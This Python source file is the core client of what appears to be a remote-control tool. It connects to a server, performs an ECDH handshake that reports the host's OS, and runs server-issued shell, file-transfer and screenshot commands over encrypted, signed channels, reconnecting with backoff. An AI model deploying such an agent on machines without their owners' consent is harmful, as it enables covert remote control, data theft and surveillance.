# Core client implementation.

import json
import logging
import queue
import select
import socket
import sys
import threading
import time
from typing import Any, Dict, Optional

from common.constants import (
    CONNECT_TIMEOUT_SEC,
    DEFAULT_CLIENT_HOST,
    DEFAULT_PORT,
    DOWNLOAD_ACTION,
    HANDSHAKE_ACTION,
    HELP_ACTION,
    MAX_RETRIES,
    RETRY_BACKOFF_FACTOR,
    RETRY_DELAY,
    RETRY_DELAY_MAX,
    SCREENSHOT_ACTION,
    SHELL_ACTION,
    SOCKET_TIMEOUT_SEC,
    TEST_ACTION,
    UPLOAD_ACTION,
)
from client.commands.help import HelpCommand
from client.commands.download import DownloadCommand
from client.commands.upload import UploadCommand
from client.commands.shell import ShellCommand
from client.commands.screenshot import ScreenshotCommand
from common.protocol import (
    build_command,
    build_handshake_command,
    build_success_response,
    decode_message,
    encode_message,
    extract_dh_public_key_from_handshake_response,
    sign_message,
    verify_message,
)
from common.tcp import ProtocolError, recv_frame, send_frame
from common.crypto import Encryptor, key_from_string, CryptoError
from common.key_exchange import ECDHExchange, KeyExchangeError
from common.hmac import MessageAuthenticator
from common.platform import get_os_info

logger = logging.getLogger(__name__)


class Client:
    # Main client class handling connection and command execution.

    def __init__(
        self, host: str = DEFAULT_CLIENT_HOST, port: int = DEFAULT_PORT
    ) -> None:
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.connected = False
        self._send_lock = threading.Lock()
        self._response_waiters: Dict[str, "queue.Queue[Dict[str, Any]]"] = {}
        self._response_lock = threading.Lock()
        self._commands = {
            HELP_ACTION: HelpCommand(),
            DOWNLOAD_ACTION: DownloadCommand(),
            UPLOAD_ACTION: UploadCommand(),
            SHELL_ACTION: ShellCommand(),
            SCREENSHOT_ACTION: ScreenshotCommand(),
        }
        self._retry_count = 0
        self._shutdown = False
        self._encryptor: Optional[Encryptor] = None
        self._authenticator: Optional[MessageAuthenticator] = None

    @staticmethod
    def _calculate_backoff(attempt: int) -> float:
        # Calculate backoff delay with exponential backoff and jitter.
        import random
        delay = min(RETRY_DELAY * (RETRY_BACKOFF_FACTOR**attempt), RETRY_DELAY_MAX)
        jitter = delay * 0.1 * random.random()
        return delay + jitter

    def _reset_retry_count(self) -> None:
        # Reset retry count after successful connection.
        self._retry_count = 0

    def _increment_retry(self) -> int:
        # Increment and return the retry count.
        self._retry_count += 1
        return self._retry_count

    def connect(self) -> None:
        if self.socket is not None:
            self.disconnect()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.settimeout(CONNECT_TIMEOUT_SEC)
        try:
            sock.connect((self.host, self.port))
        except socket.timeout as exc:
            logger.error(f"Connection timeout to {self.host}:{self.port}: {exc}")
            sock.close()
            raise ConnectionError(f"Connection timeout: {exc}") from exc
        except (ConnectionRefusedError, OSError) as exc:
            logger.error(f"Failed to connect to {self.host}:{self.port}: {exc}")
            sock.close()
            raise
        sock.settimeout(SOCKET_TIMEOUT_SEC)
        self.socket = sock
        self.connected = True
        self._reset_retry_count()
        logger.info(f"TCP connection established to {self.host}:{self.port}")

    def handshake(self) -> None:
        if self.socket is None:
            raise RuntimeError("Cannot handshake: not connected")

        # Generate ECDH keypair for secure key exchange
        ecdh_exchange = ECDHExchange()
        client_dh_public = ecdh_exchange.generate_keypair()

        os_info = get_os_info()
        command = build_handshake_command(os_info=os_info, dh_public_key=client_dh_public)
        with self._send_lock:
            send_frame(self.socket, encode_message(command))
            raw = recv_frame(self.socket)
        response = decode_message(raw)
        self._validate_handshake_response(response, command["id"])

        # Extract server's ECDH public key and compute shared secret
        server_dh_public = extract_dh_public_key_from_handshake_response(response)
        if server_dh_public:
            shared_secret = ecdh_exchange.compute_shared_key(server_dh_public)
            self._encryptor = Encryptor.from_shared_secret(shared_secret)
            # Create authenticator for HMAC verification using the derived HMAC key
            if self._encryptor.hmac_key:
                self._authenticator = MessageAuthenticator(self._encryptor.hmac_key)
            logger.info("Encryption enabled via ECDH key exchange")
        else:
            raise ValueError("Server did not provide ECDH public key for secure key exchange")

        logger.info(f"Handshake completed with server (OS: {os_info.get('os_type')})")

    @staticmethod
    def _validate_handshake_response(
        message: Dict[str, Any], expected_request_id: str
    ) -> None:
        if message.get("type") != "response":
            raise ValueError("Handshake reply must be a response message")
        if message.get("action") != HANDSHAKE_ACTION:
            raise ValueError("Invalid handshake response action")
        if message.get("id") != expected_request_id:
            raise ValueError("Handshake response id mismatch")
        if message.get("status") != "success":
            raise ValueError("Handshake rejected by server")

    def _encrypt_data(self, data: bytes) -> bytes:
        # Encrypt data if encryption is available.
        if self._encryptor is not None:
            return self._encryptor.encrypt(data)
        return data

    def _decrypt_data(self, data: bytes) -> bytes:
        # Decrypt data if encryption is available.
        if self._encryptor is not None:
            return self._encryptor.decrypt(data)
        return data

    def _send_encrypted_frame(self, message: Dict[str, Any]) -> None:
        # Send an encrypted framed message.
        if self.socket is None:
            raise ConnectionError("Not connected")
        plaintext = encode_message(message)
        ciphertext = self._encrypt_data(plaintext)
        send_frame(self.socket, ciphertext)

    def _recv_encrypted_frame(self) -> Dict[str, Any]:
        # Receive and decrypt a framed message.
        if self.socket is None:
            raise ConnectionError("Not connected")
        ciphertext = recv_frame(self.socket)
        plaintext = self._decrypt_data(ciphertext)
        return decode_message(plaintext)

    def _handle_incoming_message(self, message: Dict[str, Any]) -> None:
        if message.get("type") == "response":
            if self._authenticator and not verify_message(message, self._authenticator):
                logger.error("HMAC verification failed for response")
                return
            rid = str(message.get("id", ""))
            with self._response_lock:
                waiter = self._response_waiters.pop(rid, None)
            if waiter is not None:
                waiter.put(message)
                return
            logger.info(f"Received response: {message}")
            return
        if message.get("type") == "command":
            action = message.get("action")
            logger.info(f"Received command: {message}")
            if self._authenticator and not verify_message(message, self._authenticator):
                logger.error(f"HMAC verification failed for command {action}")
                return
            if self._authenticator:
                logger.debug(f"HMAC verified for command {action}")
            
            if self.socket is None:
                return
            req_id = str(message.get("id", ""))
            if action in self._commands:
                result = self._commands[action].execute(message.get("params", {}))
                reply = build_success_response(
                    req_id,
                    action,
                    payload=json.dumps(result),
                    message=f"{action}-ok",
                )
            elif action == TEST_ACTION:
                reply = build_success_response(
                    req_id, TEST_ACTION, payload='{"ok":true}', message="test-ok"
                )
            else:
                logger.warning(f"Unknown command action: {action}")
                return
            
            # Sign the response if we have an authenticator
            if self._authenticator:
                reply = sign_message(reply, self._authenticator)
            
            with self._send_lock:
                self._send_encrypted_frame(reply)
            return
        logger.warning(f"Unhandled message: {message}")

    def _receive_loop(self) -> None:
        if self.socket is None:
            return
        try:
            while self.connected:
                try:
                    message = self._recv_encrypted_frame()
                    self._handle_incoming_message(message)
                except socket.timeout:
                    if self.connected:
                        logger.debug("Socket timeout, continuing receive loop")
                        continue
                    break
                except CryptoError as exc:
                    logger.error(f"Decryption error: {exc}")
                    raise
        except (ConnectionError, OSError, ProtocolError, json.JSONDecodeError, CryptoError) as exc:
            logger.warning(f"Receive loop ended: {exc}")
        finally:
            self.connected = False

    def _send_test_command(self) -> None:
        if self.socket is None or not self.connected:
            logger.error("Not connected")
            return
        cmd = build_command(TEST_ACTION, {})
        
        # Sign the command if we have an authenticator
        if self._authenticator:
            cmd = sign_message(cmd, self._authenticator)
        
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            with self._send_lock:
                self._send_encrypted_frame(cmd)
            response = waiter.get(timeout=30.0)
            logger.info(f"Test round-trip OK: {response}")
        except queue.Empty:
            logger.error("Timed out waiting for test response from server")
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def _input_loop(self) -> None:
        while self.connected:
            try:
                print("client> ", end="", flush=True)
                
                while self.connected:
                    if select.select([sys.stdin], [], [], 0.1)[0]:
                        break
                
                if not self.connected:
                    break
                    
                line = sys.stdin.readline()
                if not line:
                    break
                line = line.strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not line:
                continue
            if line == "test":
                self._send_test_command()
            elif line in ("quit", "exit"):
                self.shutdown()
                break
            else:
                logger.warning(f"Unknown input: {line}")

    def run_receive_loop(self) -> None:
        # Block processing framed messages until the connection drops.
        self._receive_loop()

    def run_session(self) -> None:
        # Connect, handshake, then process bidirectional traffic.
        self.connect()
        self.handshake()
        recv_thread = threading.Thread(
            target=self._receive_loop, name="client-recv", daemon=True
        )
        recv_thread.start()
        try:
            self._input_loop()
        finally:
            self.disconnect()
            recv_thread.join(timeout=2.0)
        
        # If we exited input loop due to disconnect (not user quit), raise to trigger retry
        if not self._shutdown and not self.connected:
            raise ConnectionError("Connection lost")

    def disconnect(self) -> None:
        self.connected = False
        self._encryptor = None
        self._authenticator = None
        if self.socket:
            try:
                self.socket.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                self.socket.close()
            except OSError:
                pass
            self.socket = None
        logger.info("Client disconnected")

    def shutdown(self) -> None:
        # Shutdown the client completely (no reconnection).
        self._shutdown = True
        self.disconnect()
        logger.info("Client shutdown requested")
